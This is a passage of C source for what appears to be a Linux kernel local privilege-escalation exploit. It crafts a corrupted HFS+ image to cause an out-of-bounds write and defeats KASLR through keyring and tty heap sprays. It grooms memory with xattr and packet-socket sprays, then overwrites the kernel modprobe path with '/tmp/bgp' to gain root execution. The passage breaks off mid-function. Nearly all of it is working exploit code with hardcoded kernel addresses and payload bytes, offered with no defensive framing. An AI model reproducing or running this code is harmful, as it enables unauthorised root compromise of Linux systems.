*)(hfs_buffer+attr_tree_start_address);\n    unsigned char *address_node = hfs_buffer + attr_tree_start_address_base + 0x8000;\n\n    printf(\"[+] Corrupting HFS attribute record key length\\n\");\n\n    struct hfs_bnode_desc *first_node = (struct hfs_bnode_desc *)address_node;\n\n    printf(\"\\tNode next: 0x%x\\n\", be32toh(first_node-&gt;next));\n    printf(\"\\tNode prev: 0x%x\\n\", be32toh(first_node-&gt;prev));\n    printf(\"\\tNode type: \");\n    if (first_node-&gt;type == HFS_NODE_HEADER)\n        printf(\"HFS_NODE_HEADER\\n\");\n    else\n        printf(\"0x%x\\n\", first_node-&gt;type);\n\n    printf(\"\\tNode number of records: 0x%x\\n\", be16toh(first_node-&gt;num_recs));\n\n    struct hfsplus_attr_key *first_key = (struct hfsplus_attr_key *)(address_node + sizeof(struct hfs_bnode_desc));\n\n    printf(\"\\tKey length (current): 0x%x\\n\", be16toh(first_key-&gt;key_len));\n    first_key-&gt;key_len = htobe16(new_length);\n\n    printf(\"\\tKey length (corrupted): 0x%x\\n\", be16toh(first_key-&gt;key_len));\n}\n\n\nvoid write_payload(unsigned char *hfs_buffer, size_t len, uint8_t *payload, uint16_t payload_length)\n{\n    struct hfsplus_vh *hfs_vh = (struct hfsplus_vh *)(hfs_buffer+0x400);\n    size_t blocksize = be32toh(hfs_vh-&gt;blocksize);\n    size_t attr_tree_start_address_base = be32toh(hfs_vh-&gt;attr_file.extents-&gt;start_block) * blocksize;\n    size_t attr_tree_start_address = attr_tree_start_address_base + sizeof(struct hfs_bnode_desc);\n    struct hfs_btree_header_rec *attr_tree = (struct hfs_btree_header_rec *)(hfs_buffer+attr_tree_start_address);\n    unsigned char *address_node = hfs_buffer + attr_tree_start_address_base + 0x8000;\n    struct hfsplus_attr_key *first_key = (struct hfsplus_attr_key *)(address_node + sizeof(struct hfs_bnode_desc));\n\n    printf(\"[+] Writing kmalloc-1k payload\\n\");\n\n    /* Make some 'A' padding */\n    memset((void *)first_key + 0xd7, 0x41, 4*0x400);\n\n    uint8_t *address = (uint8_t *)(address_node + sizeof(struct hfs_bnode_desc) + 0x400);\n\n    memcpy(address, payload, payload_length);\n}\n\nvoid hack_hfs_keyring(unsigned char *hfs_buffer, size_t len, uint64_t dummy)\n{\n    /* Let's check some basic information about our volume */\n    parse_volume(hfs_buffer, len);\n\n    /* First, we hack the attribute B-tree a little bit */\n    resize_nodes(hfs_buffer, len);\n\n    /* Remove root */\n    remove_root(hfs_buffer, len);\n\n    /* Corrupt key length */\n    corrupt_key_len(hfs_buffer, len, 0x418 - 2);\n\n    uint8_t payload[24] = {\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0xff, 0xff, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53\n    };\n\n    uint16_t payload_len = sizeof(payload);\n\n    /* Write kmalloc-1k payload */\n    write_payload(hfs_buffer, len, payload, payload_len);\n}\n\nvoid hack_hfs_modprobe_one(unsigned char *hfs_buffer, size_t len, uint64_t kaslr_base)\n{\n    /* Let's check some basic information about our volume */\n    parse_volume(hfs_buffer, len);\n\n    /* First, we hack the attribute B-tree a little bit */\n    resize_nodes(hfs_buffer, len);\n\n    /* Remove root */\n    remove_root(hfs_buffer, len);\n\n    /* Corrupt key length */\n    /* -2 of what you want because fs/hfsplus/bnode.c#L66*/\n    corrupt_key_len(hfs_buffer, len, 0x410 - 2);\n\n/*\n    uint8_t payload[24] = {\n    0x3c, 0xf6, 0xb3, 0x82, 0xff, 0xff, 0xff, 0xff,\n    0x2f, 0x62, 0x67, 0x70, 0x81, 0x88, 0xff, 0xff, \n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00\n    };\n*/\n\n/*00000000: 38f6 b382 ffff ffff 2f74 6d70 8188 ffff  8......./tmp....                                                                                          │*/\n    uint8_t payload[16] = {\n    0x38, 0xf6, 0xb3, 0x82, 0xff, 0xff, 0xff, 0xff,\n    0x2f, 0x74, 0x6d, 0x70, 0x81, 0x88, 0xff, 0xff\n    };\n\n    if (kaslr_base) {\n// (gdb) set *(long*)(0xffff8881019be000) = 0xffffffff82b3f638                                                                                                  \n// (gdb) set *(long*)(0xffff8881019be008) = 0xffff8881706d742f   \n/*\n#define MODPROBE_ADDR_ONE 0xffffffff82b3f638\n#define MODPROBE_ADDE_TWO 0xffffffff82b3f63c\n\n#define KERNEL_BASE 0xffffffff81000000\n*/\n\n        printf(\"[+] Fixing up first payload with kaslr base: %lx\\n\", kaslr_base);\n        uint64_t target = MODPROBE_ADDR_ONE - KERNEL_BASE + kaslr_base;\n        for (int i = 0; i &lt; 8; i++) {\n            payload[i] = (uint8_t)((target &gt;&gt; (8 * i)) &amp; 0xFF);\n        }\n    }\n\n\n    uint16_t payload_len = sizeof(payload);\n\n    /* Write kmalloc-1k payload */\n    write_payload(hfs_buffer, len, payload, payload_len);\n}\n\nvoid hack_hfs_modprobe_two(unsigned char *hfs_buffer, size_t len, uint64_t kaslr_base)\n{\n    /* Let's check some basic information about our volume */\n    parse_volume(hfs_buffer, len);\n\n    /* First, we hack the attribute B-tree a little bit */\n    resize_nodes(hfs_buffer, len);\n\n    /* Remove root */\n    remove_root(hfs_buffer, len);\n\n    /* Corrupt key length */\n    /* -2 of what you want because fs/hfsplus/bnode.c#L66*/\n    corrupt_key_len(hfs_buffer, len, 0x410 - 2);\n\n/*00000000: 3cf6 b382 ffff ffff 2f62 6770 8188 ffff  &lt;......./bgp....         */\n\n    uint8_t payload[16] = {\n    0x3c, 0xf6, 0xb3, 0x82, 0xff, 0xff, 0xff, 0xff,\n    0x2f, 0x62, 0x67, 0x70, 0x81, 0x88, 0xff, 0xff\n    };\n\n    if (kaslr_base) {\n// (gdb) set *(long*)(0xffff8881019be000) = 0xffffffff82b3f638                                                                                                  \n// (gdb) set *(long*)(0xffff8881019be008) = 0xffff8881706d742f   \n/*\n#define MODPROBE_ADDR_ONE 0xffffffff82b3f638\n#define MODPROBE_ADDE_TWO 0xffffffff82b3f63c\n\n#define KERNEL_BASE 0xffffffff81000000\n*/\n\n        printf(\"[+] Fixing up first payload with kaslr base: %lx\\n\", kaslr_base);\n        uint64_t target = MODPROBE_ADDR_TWO - KERNEL_BASE + kaslr_base;\n        for (int i = 0; i &lt; 8; i++) {\n            payload[i] = (uint8_t)((target &gt;&gt; (8 * i)) &amp; 0xFF);\n        }\n    }\n\n\n    uint16_t payload_len = sizeof(payload);\n\n    /* Write kmalloc-1k payload */\n    write_payload(hfs_buffer, len, payload, payload_len);\n}\n\n/* Function to decompress data using zlib with gzip format */\nint decompress_gzip(const unsigned char *src, size_t src_len, unsigned char **dest, size_t *dest_len)\n{\n    z_stream strm;\n    int ret;\n    size_t output_size = CHUNK;  /* Initial buffer size */\n\n    /* Allocate memory for the destination buffer */\n    *dest = malloc(output_size);\n    if (*dest == NULL) {\n        fprintf(stderr, \"Memory allocation failed\\n\");\n        return Z_MEM_ERROR;\n    }\n\n    /* Initialize the zlib stream structure */\n    strm.zalloc = Z_NULL;\n    strm.zfree = Z_NULL;\n    strm.opaque = Z_NULL;\n    strm.avail_in = src_len;\n    strm.next_in = (unsigned char *)src;\n\n    /* Initialize the zlib stream for decompression in gzip mode */\n    /* 16 + MAX_WBITS enables gzip format */\n    ret = inflateInit2(&amp;strm, 16 + MAX_WBITS);\n    if (ret != Z_OK) {\n        /* Clean up on failure */\n        free(*dest);\n        return ret;\n    }\n\n    /* Track total output size */\n    size_t total_out = 0;\n\n    do {\n        if (total_out + CHUNK &gt; output_size) {\n            /* Resize the buffer if it's not big enough */\n            output_size += CHUNK;\n            unsigned char *new_dest = realloc(*dest, output_size);\n\n            if (new_dest == NULL) {\n                inflateEnd(&amp;strm);\n                free(*dest);\n                fprintf(stderr, \"Reallocation failed\\n\");\n                return Z_MEM_ERROR;\n            }\n            *dest = new_dest;\n        }\n\n        strm.avail_out = CHUNK;\n        strm.next_out = *dest + total_out;\n\n        /* Perform the decompression */\n        ret = inflate(&amp;strm, Z_NO_FLUSH);\n        if (ret == Z_STREAM_ERROR) {\n            inflateEnd(&amp;strm);\n            free(*dest);\n            fprintf(stderr, \"Stream error during inflation\\n\");\n            return ret;\n        }\n        /* Update total output size */\n        total_out += CHUNK - strm.avail_out;\n    } while (ret != Z_STREAM_END);\n\n    /* Set the actual output length */\n    *dest_len = total_out;\n\n    /* Clean up */\n    inflateEnd(&amp;strm);\n    return Z_OK;\n}\n\nint prepare_filesystem(void (*hfs_mutator)(unsigned char *, size_t, uint64_t), char *hfs_filename, uint64_t kaslr_base)\n{\n    unsigned char *compressed_data = vanilla_hfs_bin;\n    size_t compressed_size = vanilla_hfs_bin_len;\n\n    /* Output buffer */\n    unsigned char *decompressed = NULL;\n    size_t decompressed_len = 0;\n\n    /* Decompress 3 times */\n    for (int i = 0; i &lt; 3; i++) {\n        if (decompress_gzip(compressed_data, compressed_size, &amp;decompressed, &amp;decompressed_len) != Z_OK) {\n            fprintf(stderr, \"Decompression failed at iteration %d\\n\", i + 1);\n            return 1;\n        }\n        /* For the next round, the output becomes the input */\n        compressed_size = decompressed_len;\n        /* Reuse the decompressed data as input */\n        compressed_data = decompressed;\n    }\n    printf(\"[+] Decompressed size: 0x%lx\\n\", decompressed_len);\n\n    hfs_mutator(decompressed, decompressed_len, kaslr_base);\n\n    FILE *file = fopen(hfs_filename, \"wb\");\n    size_t written = fwrite(decompressed, sizeof(unsigned char), decompressed_len, file);\n\n    if (written != decompressed_len) {\n        perror(\"Failed to write the buffer to the file\");\n        fclose(file);\n        exit(EXIT_FAILURE);\n    }\n    fclose(file);\n\n    /* Free the allocated memory */\n    free(decompressed);\n\n    return 0;\n}\n\nlong long get_precise_time(void)\n{\n    struct timespec ts;\n\n    clock_gettime(CLOCK_REALTIME, &amp;ts);\n    long long milliseconds_since_epoch =\n                (long long)(ts.tv_sec) * 1000 + (long long)(ts.tv_nsec) / 1000000;\n    return milliseconds_since_epoch;\n}\n\n/* Function to check if a pointer is a valid kernel pointer within the KASLR range */\nbool is_valid_pointer(uint64_t ptr)\n{\n/*    if (ptr &gt;= KERNEL_BASE_LOWER &amp;&amp; ptr &lt;= KERNEL_BASE_UPPER)\n *        printf(\"Valid pointer: %lx\\n\", ptr);\n */\n    return (ptr &gt;= KERNEL_BASE_LOWER &amp;&amp; ptr &lt;= KERNEL_BASE_UPPER);\n}\n\n/* Function to extract a 64-bit pointer from a byte buffer at a given position */\nuint64_t extract_pointer(uint8_t *buffer, int pos)\n{\n    uint64_t ptr = 0;\n\n    for (int i = 0; i &lt; 8; i++) {\n        /* Extract 8 bytes as a 64-bit pointer */\n        ptr |= ((uint64_t)buffer[pos + i] &lt;&lt; (i * 8));\n    }\n    return ptr;\n}\n\n/* Function to search for pointer triples and calculate KASLR base */\nvoid find_pointer_triples(uint8_t *buffer, int buffer_size, int *success, uint64_t *kaslr_base_out)\n{\n    for (int i = 0; i &lt; buffer_size - 8; i++) {\n        /* Extract the first pointer */\n        uint64_t first_ptr = extract_pointer(buffer, i);\n\n        if (!is_valid_pointer(first_ptr))\n            /* Skip invalid pointers */\n            continue;\n\n\n        /* Extract the second pointer at the offset */\n        int second_ptr_pos = i + OFFSET_2ND_PTR;\n\n        if (second_ptr_pos + 8 &gt; buffer_size)\n            continue;\n\n        uint64_t second_ptr = extract_pointer(buffer, second_ptr_pos);\n\n        if (!is_valid_pointer(second_ptr))\n            continue;\n\n\n        /* Extract the third pointer at the next offset */\n        int third_ptr_pos = second_ptr_pos + OFFSET_3RD_PTR - OFFSET_2ND_PTR;\n\n        if (third_ptr_pos + 8 &gt; buffer_size)\n            continue;\n\n        uint64_t third_ptr = extract_pointer(buffer, third_ptr_pos);\n\n        if (!is_valid_pointer(third_ptr))\n            continue;\n\n        /* Calculate the differences */\n        int64_t diff_first = first_ptr - BASE_ADDR_FIRST;\n        int64_t diff_second = second_ptr - BASE_ADDR_SECOND;\n        int64_t diff_third = third_ptr - BASE_ADDR_THIRD;\n\n        printf(\"\\n[+] Pointer triple found at byte offset %x:\\n\", i);\n        printf(\"\\tFirst pointer:  0x%lx (Difference: 0x%lx)\\n\", first_ptr, diff_first);\n        printf(\"\\tSecond pointer: 0x%lx (Difference: 0x%lx)\\n\", second_ptr, diff_second);\n        printf(\"\\tThird pointer:  0x%lx (Difference: 0x%lx)\\n\", third_ptr, diff_third);\n\n        /* If all three differences match, calculate the KASLR base */\n        if (diff_first == diff_second &amp;&amp; diff_first == diff_third) {\n            uint64_t kaslr_base = diff_first + KERNEL_BASE;\n\n            printf(\"\\n[+] KASLR base: 0x%lx\\n\", kaslr_base);\n            *success = 1;\n            *kaslr_base_out = kaslr_base;\n\n            /* Stop once we find the KASLR base */\n            return;\n        }\n    }\n}\n\n\nsem_t *make_semaphore(int initial){\n    int shm = shmget(IPC_PRIVATE, sizeof(sem_t), IPC_CREAT | 0666);\n\n    sem_t *semaphore = shmat(shm, NULL, 0);\n    sem_init(semaphore, 1, initial);\n    return semaphore;\n}\n\nvoid set_cpu_affinity(int cpu_n, pid_t pid)\n{\n    cpu_set_t set;\n\n    CPU_ZERO(&amp;set);\n    CPU_SET(cpu_n, &amp;set);\n\n    if (sched_setaffinity(pid, sizeof(set), &amp;set) &lt; 0)\n        do_error_exit(\"sched_setaffinity\");\n}\n\nvoid unshare_setup(void)\n{\n    char edit[0x100];\n    int tmp_fd;\n\n    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);\n\n    tmp_fd = open(\"/proc/self/setgroups\", O_WRONLY);\n    write(tmp_fd, \"deny\", strlen(\"deny\"));\n    close(tmp_fd);\n\n    tmp_fd = open(\"/proc/self/uid_map\", O_WRONLY);\n    snprintf(edit, sizeof(edit), \"0 %d 1\", getuid());\n    write(tmp_fd, edit, strlen(edit));\n    close(tmp_fd);\n\n    tmp_fd = open(\"/proc/self/gid_map\", O_WRONLY);\n    snprintf(edit, sizeof(edit), \"0 %d 1\", getgid());\n    write(tmp_fd, edit, strlen(edit));\n    close(tmp_fd);\n}\n\n\nvoid unshare_setup_xattr(uid_t uid, gid_t gid)\n{\n    int temp, ret;\n    char edit[0x100];\n\n    ret = unshare(CLONE_NEWNS | CLONE_NEWUSER);\n    if (ret &lt; 0)\n        do_error_exit(\"unshare\");\n\n    temp = open(\"/proc/self/setgroups\", O_WRONLY);\n    write(temp, \"deny\", strlen(\"deny\"));\n    close(temp);\n\n    temp = open(\"/proc/self/uid_map\", O_WRONLY);\n    snprintf(edit, sizeof(edit), \"0 %d 1\\n\", uid);\n    write(temp, edit, strlen(edit));\n    close(temp);\n\n    temp = open(\"/proc/self/gid_map\", O_WRONLY);\n    snprintf(edit, sizeof(edit), \"0 %d 1\\n\", gid);\n    write(temp, edit, strlen(edit));\n    close(temp);\n\n    ret = mount(\"none\", \"/\", NULL, MS_REC | MS_PRIVATE, NULL);\n    if (ret &lt; 0)\n        perror(\"mount root\");   \n}\n\nvoid write_file(char *path, char *buf, int size)\n{\n    int fd = open(path, O_RDWR|O_CREAT);\n\n    write(fd, buf, size);\n    close(fd);\n}\n\nvoid prepare_mounts(void)\n{\n    system(\"mkdir /tmp/mnt0\");\n    system(\"mkdir /tmp/mnt1\");  \n    system(\"mkdir /tmp/mnt2\");  \n}\n\n\nvoid prepare_tmpfs(void)\n{\n    system(\"mkdir /tmp/tmpfs\");\n    system(\"mount -t tmpfs -o size=50M none /tmp/tmpfs\");\n\n    write_file(\"/tmp/tmpfs/xattr_node\", \"data\", 0x4);\n    write_file(\"/tmp/tmpfs/xattr_node_2\", \"data\", 0x4);\n    write_file(\"/tmp/tmpfs/xattr_node_3\", \"data\", 0x4);\n}\n\nvoid unlink_xattr(int id)\n{\n    char xattr_name[XATTR_NAME_MAX_SIZE];\n\n    snprintf(xattr_name, XATTR_NAME_MAX_SIZE, \"security.%d\", id);\n    removexattr(\"/tmp/tmpfs/xattr_node\", xattr_name);\n}\n\nvoid spray_xattr(void)\n{\n    char xattr_name[XATTR_NAME_MAX_SIZE];\n    char xattr_value[XATTR_NAME_MAX_SIZE];\n\n    int base_nodes[] = {7, 3, 11, 1, 5, 9, 13};\n    int leaf_nodes[] = {0, 2, 4, 6, 8, 10, 12, 14};\n    int base_size = sizeof(base_nodes) / sizeof(base_nodes[0]);\n    int leaf_size = sizeof(leaf_nodes) / sizeof(leaf_nodes[0]);\n\n    for (int i = 100; i &lt; 111; i++) {\n        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, \"attilaszia-%d%512d\", i, i);\n        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, \"security.%d\", i);\n        setxattr(\"/tmp/tmpfs/xattr_node_3\", xattr_name, xattr_value, strlen(xattr_value), 0);\n    }\n\n\n    for (int i = 0; i &lt; base_size; i++) {\n        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, \"attilaszia-%d%512d\", base_nodes[i], base_nodes[i]);\n        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, \"security.%02d\", base_nodes[i]);\n        setxattr(\"/tmp/tmpfs/xattr_node\", xattr_name, xattr_value, strlen(xattr_value), 0);\n    }\n\n    for (int i = 0; i &lt; leaf_size; i++) {\n        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, \"attilaszia-%d%512d\", leaf_nodes[i], leaf_nodes[i]);\n        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, \"security.%02d\", leaf_nodes[i]);\n        setxattr(\"/tmp/tmpfs/xattr_node\", xattr_name, xattr_value, strlen(xattr_value), 0);\n    }\n}\n\nvoid spray_xattr_two(void)\n{\n    char xattr_name[XATTR_NAME_MAX_SIZE];\n    char xattr_value[XATTR_NAME_MAX_SIZE];\n\n    int base_nodes[] = {7, 3, 11, 1, 5, 9, 13};\n    int leaf_nodes[] = {0, 2, 4, 6, 8, 10, 12, 14};\n    int base_size = sizeof(base_nodes) / sizeof(base_nodes[0]);\n    int leaf_size = sizeof(leaf_nodes) / sizeof(leaf_nodes[0]);\n\n\n    for (int i = 200; i &lt; 211; i++) {\n        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, \"attilaszia-%d%512d\", i, i);\n        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, \"security.%d\", i);\n        setxattr(\"/tmp/tmpfs/xattr_node_3\", xattr_name, xattr_value, strlen(xattr_value), 0);\n    }\n\n    for (int i = 0; i &lt; base_size; i++) {\n        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, \"attilaszia-%d%512d\", base_nodes[i], base_nodes[i]);\n        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, \"security.%02d\", base_nodes[i]);\n        setxattr(\"/tmp/tmpfs/xattr_node_2\", xattr_name, xattr_value, strlen(xattr_value), 0);\n    }\n\n    for (int i = 0; i &lt; leaf_size; i++) {\n        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, \"attilaszia-%d%512d\", leaf_nodes[i], leaf_nodes[i]);\n        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, \"security.%02d\", leaf_nodes[i]);\n        setxattr(\"/tmp/tmpfs/xattr_node_2\", xattr_name, xattr_value, strlen(xattr_value), 0);\n    }\n}\n\nchar *read_modprobe_content(void) \n{\n    FILE *file;\n    char buffer[BUFFER_SIZE];\n    char *content;\n\n    file = fopen(MODPROBE_PATH, \"r\");\n    if (file == NULL) {\n        perror(\"Failed to open /proc/sys/kernel/modprobe\");\n        return NULL;\n    }\n    if (fgets(buffer, sizeof(buffer), file) == NULL) {\n        perror(\"Failed to read from /proc/sys/kernel/modprobe\");\n        fclose(file);\n        return NULL;\n    }   \n    content = (char*)malloc(strlen(buffer) + 1);\n    if (content == NULL) {\n        perror(\"Failed to allocate memory\");\n        fclose(file);\n        return NULL;\n    }\n    strcpy(content, buffer);    \n    fclose(file);   \n\n    size_t len = strlen(content);\n\n    if (len &gt; 0 &amp;&amp; content[len - 1] == '\\n') {\n        content[len - 1] = '\\0';\n    }\n\n    return content;\n}\n\nint check_modprobe(void)\n{\n    const char *fixed_string = \"/sbin/modprobe\";\n\n    usleep(100000);\n\n    char *modprobe_content = read_modprobe_content();\n    if (modprobe_content != NULL) {\n        printf(\"[+] modprobe: %s\\n\", modprobe_content);\n            return strcmp(modprobe_content, fixed_string);\n        }   \n    else {\n        do_error_exit(\"check_modprobe couldn't read modprobe content\");\n    }\n}\n\nint check_modprobe_final(void)\n{\n    const char *fixed_string = \"/tmp/bgp\";\n\n    usleep(100000);\n\n    char *modprobe_content = read_modprobe_content();\n    if (modprobe_content != NULL) {\n        printf(\"[+] modprobe: %s\\n\", modprobe_content);\n            return !strncmp(modprobe_content, fixed_string, 8);\n        }   \n    else {\n        do_error_exit(\"check_modprobe couldn't read modprobe content\");\n    }\n}\n\n\n\nvoid check_for_modprobe_overwrite_one(void){\n    char xattr_name[XATTR_NAME_MAX_SIZE];\n    char xattr_value[XATTR_NAME_MAX_SIZE];\n\n    int redblack[] = {0, 2, 4, 6, 8, 10, 12, 14};\n\n    int success = false;\n\n    printf(\"[+] Checking for xattr corruptions\\n\");\n\n    int array_size = sizeof(redblack) / sizeof(redblack[0]);\n    for (int i = 0; i &lt; array_size; i++) {              \n        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, \"security.%02d\", redblack[i]);\n        printf(\"[+] current xattr to delete: %s\\n\", xattr_name);\n\n        /* rbtree __rb_change_child should happen here */\n        removexattr(\"/tmp/tmpfs/xattr_node\", xattr_name);\n\n        if (check_modprobe()) {\n            printf(\"[+] Successfully corrupted modprobe path #1\\n\");            \n            fflush(stdout);\n\n            system(\"cat /proc/sys/kernel/modprobe\");            \n            success = true;\n            sleep(1);\n            break;\n        }\n    }\n    if (!success){\n        sleep(1);\n        do_error_exit(\"Couldn't overwrite first part of modprobe\");     \n    }\n\n}\n\nvoid check_for_modprobe_overwrite_two(void){\n    char xattr_name[XATTR_NAME_MAX_SIZE];\n    char xattr_value[XATTR_NAME_MAX_SIZE];\n\n    int redblack[] = {0, 2, 4, 6, 8, 10, 12, 14};\n\n    int success = false;\n\n    printf(\"[+] Checking for xattr corruptions\\n\");\n\n    int array_size = sizeof(redblack) / sizeof(redblack[0]);\n    for (int i = 0; i &lt; array_size; i++) {              \n        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, \"security.%02d\", redblack[i]);\n        printf(\"[+] current xattr to delete: %s\\n\", xattr_name);\n\n        /* rbtree __rb_change_child should happen here */\n        removexattr(\"/tmp/tmpfs/xattr_node_2\", xattr_name);\n\n        if (check_modprobe_final()) {\n            printf(\"[+] Successfully corrupted modprobe path #2\\n\");            \n            fflush(stdout);\n\n            system(\"cat /proc/sys/kernel/modprobe\");            \n            success = true;\n            sleep(5);\n            break;\n        }\n    }\n    if (!success){\n        sleep(1);\n        do_error_exit(\"Couldn't overwrite modprobe\");       \n    }\n\n}\n\nvoid trigger_oob(void)\n{\n    key_serial_t *id_buffer;\n\n    id_buffer = spray_keyring(SPRAY_KEY_SIZE, SPRAY_KEY_SIZE_INIT);\n\n    spray_tty_struct(SPRAY_TTY_SIZE);\n\n    char *attr_value = \"dummy\";\n    int result = setxattr(\"/tmp/mnt0/hacked_node\", \"user.1\", attr_value, strlen(attr_value), 0);\n\n    if (result != 0)\n        do_error_exit(\"setxattr attempt on vuln fs\");\n\n    kaslr_base_recovered = get_keyring_leak(id_buffer, (uint32_t)SPRAY_KEY_SIZE);\n    sleep(1);\n\n    release_keys(id_buffer, SPRAY_KEY_SIZE);\n}\n\nvoid trigger_oob_xattr(void)\n{\n    char *attr_value = \"dummy\";\n    int result = setxattr(\"/tmp/mnt1/hacked_node\", \"user.1\", attr_value, strlen(attr_value), 0);\n\n    if (result != 0)\n        do_error_exit(\"setxattr attempt on vuln fs\");   \n}\n\nvoid trigger_oob_xattr_two(void)\n{\n    char *attr_value = \"dummy\";\n    int result = setxattr(\"/tmp/mnt2/hacked_node\", \"user.1\", attr_value, strlen(attr_value), 0);\n\n    if (result != 0)\n        do_error_exit(\"setxattr attempt on vuln fs\");   \n}\n\n\n/* Function to monitor /proc/contig_alloc_info */\nvoid *monitor_function(void *arg)\n{\n    int consecutive_ones = 0;\n\n    const int required_consecutive = 10;\n    /* 0.1 seconds in microseconds */\n    const useconds_t interval = 100000;\n\n    while (1) {\n        char buffer[128];\n        FILE *file;\n\n        /* Open the file for reading */\n        file = fopen(\"/proc/contig_alloc_info\", \"r\");\n        if (file == NULL) {\n            perror(\"Failed to open /proc/contig_alloc_info\");\n            pthread_exit(NULL);\n        }\n\n        /* Read a line from the file */\n        if (fgets(buffer, sizeof(buffer), file) != NULL) {\n            int value;\n            char timestamp[64];\n\n            /* Parse the timestamp and value */\n            if (sscanf(buffer, \"%s %d\", timestamp, &amp;value) == 2) {\n                if (value == 1) {\n                    consecutive_ones++;\n                    if (consecutive_ones == required_consecutive) {\n                        printf(\"Value is 1 for %d consecutive checks at %s\\n\", required_consecutive, timestamp);\n                        printf(\"UNIX timestamp at side-channel trigger: %lld\\n\", get_precise_time());\n                        // trigger_oob();\n                    }\n                } else {\n                    /* Reset the counter if value is not 1 */\n                    consecutive_ones = 0;\n                }\n            } else {\n                fprintf(stderr, \"Failed to parse the line: %s\", buffer);\n            }\n        } else {\n            fprintf(stderr, \"Failed to read from /proc/contig_alloc_info\\n\");\n        }\n\n        fclose(file);\n\n        usleep(interval);\n    }\n    return NULL;\n}\n\nvoid print_contiginfo(void)\n{\n    char buffer[128];\n    FILE *pipe;\n\n    pipe = popen(\"cat /proc/contig_alloc_info\", \"r\");\n    if (pipe == NULL) {\n        do_error_exit(\"popen failed\");\n    return;\n    }\n\n    while (fgets(buffer, sizeof(buffer), pipe) != NULL)\n        printf(\"%s\", buffer);\n\n    pclose(pipe);\n}\n\nvoid print_buddyinfo(void)\n{\n    char buffer[128];\n    FILE *pipe;\n\n    pipe = popen(\"cat /proc/buddyinfo\", \"r\");\n    if (pipe == NULL)\n        do_error_exit(\"popen failed\");\n\n    while (fgets(buffer, sizeof(buffer), pipe) != NULL)\n        printf(\"%s\", buffer);\n\n    pclose(pipe);\n}\n\n/* pipe for cmd communication */\nint cmd_pipe_req[2], cmd_pipe_reply[2];\n\n/* create a socket and alloc pages, return the socket fd */\nint create_socket_and_alloc_pages(unsigned int size, unsigned int nr)\n{\n    struct tpacket_req req;\n    int socket_fd, version;\n    int ret;\n\n    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);\n    if (socket_fd &lt; 0) {\n        printf(\"[-] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\\n\");\n        ret = socket_fd;\n        goto err_out;\n    }\n\n    version = TPACKET_V1;\n    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,\n                     &amp;version, sizeof(version));\n    if (ret &lt; 0) {\n        printf(\"[-] failed at setsockopt(PACKET_VERSION)\\n\");\n        goto err_setsockopt;\n    }\n\n    memset(&amp;req, 0, sizeof(req));\n    req.tp_block_size = size;\n    req.tp_block_nr = nr;\n    req.tp_frame_size = 0x1000;\n    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;\n\n    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, sizeof(req));\n    if (ret &lt; 0) {\n        printf(\"[-] failed at setsockopt(PACKET_TX_RING)\\n\");\n        goto err_setsockopt;\n    }\n\n    return socket_fd;\n\nerr_setsockopt:\n    close(socket_fd);\nerr_out:\n    return ret;\n}\n\n/* the parent process should call it to send command of allocation to child */\nint alloc_page(int idx, unsigned int size, unsigned int nr)\n{\n    struct pgv_page_request req = {\n        .idx = idx,\n        .cmd = CMD_ALLOC_PAGE,\n        .size = size,\n        .nr = nr,\n    };\n    int ret;\n\n    write(cmd_pipe_req[1], &amp;req, sizeof(struct pgv_page_request));\n    read(cmd_pipe_reply[0], &amp;ret, sizeof(ret));\n\n    return ret;\n}\n\nint exit_child(void) {\n    struct pgv_page_request req = {     \n        .cmd = CMD_EXIT\n    };\n    int ret;\n\n    write(cmd_pipe_req[1], &amp;req, sizeof(struct pgv_page_request));\n    read(cmd_pipe_reply[0], &amp;ret, sizeof(ret));\n\n    return ret; \n}\n\n/* the parent process should call it to send command of freeing to child */\nint free_page(int idx)\n{\n    struct pgv_page_request req = {\n        .idx = idx,\n        .cmd = CMD_FREE_PAGE,\n    };\n    int ret;\n\n    write(cmd_pipe_req[1], &amp;req, sizeof(req));\n    read(cmd_pipe_reply[0], &amp;ret, sizeof(ret));\n\n    usleep(10000);\n\n    return ret;\n}\n\nvoid spray_cmd_handler(void)\n{\n    struct pgv_page_request req;\n    int socket_fd[PGV_PAGE_NUM];\n    int ret;\n\n    /* Create an isolated namespace*/\n    unshare_setup();\n\n    /* Handle requests */\n    do {\n        read(cmd_pipe_req[0], &amp;req, sizeof(req));\n\n        if (req.cmd == CMD_ALLOC_PAGE) {\n            ret = create_socket_and_alloc_pages(req.size, req.nr);\n            socket_fd[req.idx] = ret;\n        } else if (req.cmd == CMD_FREE_PAGE) {\n            ret = close(socket_fd[req.idx]);\n        } else if (req.cmd == CMD_EXIT) {\n            ret = 0;\n            write(cmd_pipe_reply[1], &amp;ret, sizeof(ret));\n            printf(\"[+] Exiting\\n\");\n            break;          \n        } else {            \n            printf(\"[-] invalid request: %d\\n\", req.cmd);\n        }\n\n        write(cmd_pipe_reply[1], &amp;ret, sizeof(ret));\n    } while (req.cmd != CMD_EXIT);\n\n    printf(\"[+] Finished command handler\\n\");\n    _exit(0);\n}\n\npid_t prepare_pgv_system(void)\n{\n    pid_t pid;\n    /* Pipe for pgv */\n    pipe(cmd_pipe_req);\n    pipe(cmd_pipe_reply);\n\n    /* Child process for pages spray */\n    pid 